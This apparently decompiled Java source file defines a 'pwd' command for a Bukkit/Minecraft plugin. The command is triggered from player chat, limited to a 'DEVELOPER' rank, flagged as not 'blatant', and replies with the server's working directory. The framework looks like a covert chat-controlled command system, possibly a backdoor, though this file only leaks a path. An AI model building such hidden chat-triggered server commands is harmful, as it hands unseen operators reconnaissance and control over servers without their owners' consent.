package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.Vars;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "pwd",
   description = "Print working directory",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {}
)
public class PwdCommand extends AbstractCommand {
   public PwdCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      ChatUtil.sendChat(var1.getPlayer(), Vars.CURRENT_DIR);
   }
}
